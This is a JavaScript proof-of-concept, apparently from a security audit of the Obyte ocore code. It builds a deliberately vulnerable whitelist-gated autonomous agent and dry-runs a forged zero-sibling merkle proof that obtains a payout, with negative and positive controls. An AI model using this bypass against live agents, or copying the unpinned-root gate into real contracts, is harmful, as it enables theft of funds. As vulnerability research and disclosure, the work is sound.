// E1-3 — F1 vulnerable-AA demonstration: whitelist-gated AA bypass via the vacuous merkle proof
// Real path: aa_composer.dryRunPrimaryAATrigger (the exact entry the wallet/test suite uses to
// evaluate an AA trigger and compose its response) — full trigger logic, real formula engine,
// real definition validation.
module.exports = async function (db, storage, network, validation, objectHash, signature, composer, mutex, constants) {
  const util = require("util");
  const crypto = require("crypto");
  const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
  const aa_composer = require(O_CORE + "/aa_composer.js");
  const aa_validation = require(O_CORE + "/aa_validation.js");
  const merkle = require(O_CORE + "/merkle.js");

  const sha256b64 = (s) => crypto.createHash("sha256").update(s, "utf8").digest("base64");
  const vacuousProof = (X) => "0-" + sha256b64(X);

  // The vulnerable AA — a "whitelist withdrawal" gate:
  //   "pay the received amount back to the sender ONLY if they prove merkle-tree membership"
  // The gate uses is_valid_merkle_proof WITHOUT pinning the root to a committed/anchored value.
  const aa = ["autonomous agent", {
    messages: [
      { app: "payment", payload: { asset: "base", outputs: [
        { address: "{trigger.initial_address}",
          amount: "{is_valid_merkle_proof(trigger.data.element, trigger.data.proof) ? trigger.output[[asset=base]] : 0}" }
      ] } }
    ]
  }];
  const aa_address = objectHash.getChash160(aa);

  // 1) the definition must be VALID (it is — the gate is a legal formula)
  const readGetterProps = (conn, a, f, cb) => cb(null);
  await util.promisify(aa_validation.validateAADefinition)(aa, readGetterProps, Number.MAX_SAFE_INTEGER);
  console.log("E13 AA-DEF-VALID true", aa_address);

  const dryRun = util.promisify(aa_composer.dryRunPrimaryAATrigger);

  const payoutOf = (arrResponses) => {
    for (const r of arrResponses) {
      const unit = r.objResponseUnit || r.response_unit;
      if (!unit || !unit.messages) continue;
      for (const m of unit.messages) {
        if (m.app !== "payment" || !m.payload || !m.payload.outputs) continue;
        for (const o of m.payload.outputs) {
          if (o.amount && o.amount > 0) return { aa: r.aa_address, to: o.address, amount: o.amount, bounced: r.bounced };
        }
      }
    }
    return { bounced: arrResponses[0] && arrResponses[0].bounced, error: arrResponses[0] && arrResponses[0].response && arrResponses[0].response.error };
  };

  const results = {};

  // 2) ATTACK: vacuous proof — element "not-in-any-tree", proof = 0-sibling self-consistency
  const X = "attacker-arbitrary-element-42";
  const resAttack = await dryRun({ outputs: { base: 100000 }, data: { element: X, proof: vacuousProof(X) } }, aa_address, aa);
  results.attack_vacuous = { payout: payoutOf(resAttack), responses: resAttack.length };

  // 3) NEGATIVE CONTROL: inconsistent proof (root = hash of a DIFFERENT element) — must fail
  const resBad = await dryRun({ outputs: { base: 100000 }, data: { element: X, proof: "0-" + sha256b64("some-other-element") } }, aa_address, aa);
  results.negative_inconsistent_proof = { payout: payoutOf(resBad) };

  // 4) POSITIVE CONTROL: a REAL merkle proof from a real tree — passes too (root is prover-supplied,
  //    so "real membership" is indistinguishable from self-consistency to this construct)
  const tree = ["alice", "bob", "carol", "dave", "eve"];
  const realSerialized = merkle.serializeMerkleProof(merkle.getMerkleProof(tree, 2));
  const resReal = await dryRun({ outputs: { base: 100000 }, data: { element: "carol", proof: realSerialized } }, aa_address, aa);
  results.positive_real_member = { payout: payoutOf(resReal) };

  // 5) The e01ba3e sibling-cap never mitigated the vacuous case:
  //    cap requires >50 siblings AND non-empty-string siblings; the vacuous proof has 0 siblings.
  const capAbove = "mci >= pemCurvesFixMci: siblings must be non-empty strings and <= 50 (evaluation.js:1787-1791)";
  const vacuousSiblings = 0;
  results.e01ba3e_cap = { capNote: capAbove, vacuousProofSiblings: vacuousSiblings, mitigated: false };

  console.log("E13-RESULTS " + JSON.stringify(results, null, 1));
};
